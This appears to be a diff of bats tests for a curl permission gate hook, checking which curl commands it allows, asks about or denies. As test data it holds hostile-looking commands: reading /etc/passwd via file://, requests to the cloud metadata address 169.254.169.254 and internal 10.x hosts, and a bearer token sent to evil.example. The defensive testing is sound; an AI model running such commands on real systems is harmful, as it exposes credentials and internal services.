@@ -208,3 +208,67 @@ print(json.loads(out)["hookSpecificOutput"].get("permissionDecision","allow"))
   run decision 'curl file:///etc/passwd'
   [ "$output" = "deny" ]
 }
+
+# ── 2026-09-24 prompt consolidation (docs/plans/PERMISSION_PROMPT_CONSOLIDATION.md) ─────────────
+# Census over ~/.reso/curl-audit.jsonl, 30 days: 596 "No URL parsed" asks were a URL held in a loop
+# variable, 126 were credential-bearing reads of reso's own *.localhost dev server. Each permit below
+# is paired with the sibling that must still ask or deny.
+
+@test "PERMITS: a URL in a for-loop variable or a same-command assignment is judged, not asked" {
+  [ "$(decision 'for u in "https://www.litmus.com/x" "https://klim.co.nz/y"; do echo "== $u"; curl -sSL --max-time 45 -A "Mozilla/5.0 (Mac; x)" "$u" -o l.html; done')" = "allow" ]
+  [ "$(decision 'for f in a.png b.jpg; do u="https://assets.example.com/$f"; curl -sSL -o "asset-$f" "$u"; done')" = "allow" ]
+  [ "$(decision 'U=https://www.w3.org/TR/; curl -s "$U" | head')" = "allow" ]
+}
+
+@test "SIBLINGS: resolution never hides a deny, and undecidable bindings still ask" {
+  [ "$(decision 'for u in "https://a.com/x" "http://169.254.169.254/latest"; do curl -s "$u"; done')" = "deny" ]
+  [ "$(decision 'U=http://10.0.0.5/admin; curl -s "$U"')" = "deny" ]
+  [ "$(decision 'for u in "https://a.com"; do curl -X POST -d x "$u"; done')" = "ask" ]
+  [ "$(decision 'U=https://evil.example; curl -H "Authorization: Bearer s" "$U"')" = "ask" ]
+  [ "$(decision 'u=https://ok.com; while read u; do curl "$u"; done < urls.txt')" = "ask" ]
+  [ "$(decision 'u=https://ok.com; u=http://10.0.0.1; curl "$u"')" = "ask" ]
+  [ "$(decision 'for u in $(cat list); do curl "$u"; done')" = "ask" ]
+  [ "$(decision 'for u in https://{a,b}.com; do curl "$u"; done')" = "ask" ]
+  [ "$(decision 'eval "u=https://ok.com"; curl "$u"')" = "ask" ]
+  [ "$(decision 'curl -s "$(cat /tmp/sr.url)" -o x.zip')" = "ask" ]
+}
+
+@test "PERMITS: informational curl makes no request" {
+  [ "$(decision 'which curl; curl --version | head -1')" = "allow" ]
+  [ "$(decision 'curl --help all')" = "allow" ]
+}
+
+@test "PERMITS: a credential sent only to loopback; SIBLINGS: -L, a write, a remote host still ask" {
+  [ "$(decision 'curl -s -b jar.txt http://gn.localhost:3000/api/x')" = "allow" ]
+  [ "$(decision 'curl -s http://127.0.0.1:8080/x -b c')" = "allow" ]
+  [ "$(decision 'curl -sL -b jar.txt http://gn.localhost:3000/api/x')" = "ask" ]
+  [ "$(decision 'curl -X POST -b jar http://gn.localhost:3000/api/x')" = "ask" ]
+  [ "$(decision 'curl -H "Authorization: Bearer x" https://api.tablelist.com/v1')" = "ask" ]
+  [ "$(decision 'curl -b jar http://gn.localhost.evil.com/x')" = "ask" ]
+}
+
+@test "RED ON PARENT: the pre-fix gate asked on every permit above" {
+  local pre="$BATS_TEST_TMPDIR/curl-gate-parent.py"
+  git -C "$REPO" show a7a372d2c:hooks/curl-gate.py > "$pre"
+  ! cmp -s "$GATE" "$pre" || false
+  GATE="$pre"
+  # `; curl` — the shape the parent's entry filter DID gate (a `do curl` it never saw at all; below).
+  [ "$(decision 'for u in "https://www.litmus.com/x"; do echo "== $u"; curl -sSL "$u" -o l.html; done')" = "ask" ]
+  [ "$(decision 'which curl; curl --version | head -1')" = "ask" ]
+  [ "$(decision 'curl -s -b jar.txt http://gn.localhost:3000/api/x')" = "ask" ]
+}
+
+@test "ENTRY FILTER: a curl after a newline, a keyword or a paren is gated (parent let IMDS through)" {
+  [ "$(decision $'echo x\ncurl http://169.254.169.254/')" = "deny" ]
+  [ "$(decision 'for u in "https://a.com/x" "http://169.254.169.254/latest"; do curl -s "$u"; done')" = "deny" ]
+  [ "$(decision '(curl -s http://10.0.0.1/)')" = "deny" ]
+  [ "$(decision 'if true; then curl -s http://10.0.0.1/; fi')" = "deny" ]
+  # A MENTION is still not an invocation.
+  [ "$(decision 'grep curl README.md')" = "allow" ]
+  [ "$(decision 'echo "use curl to fetch"')" = "allow" ]
+  local pre="$BATS_TEST_TMPDIR/curl-gate-parent.py"
+  git -C "$REPO" show a7a372d2c:hooks/curl-gate.py > "$pre"
+  GATE="$pre"
+  [ "$(decision $'echo x\ncurl http://169.254.169.254/')" = "allow" ]
+  [ "$(decision 'if true; then curl -s http://10.0.0.1/; fi')" = "allow" ]
+}
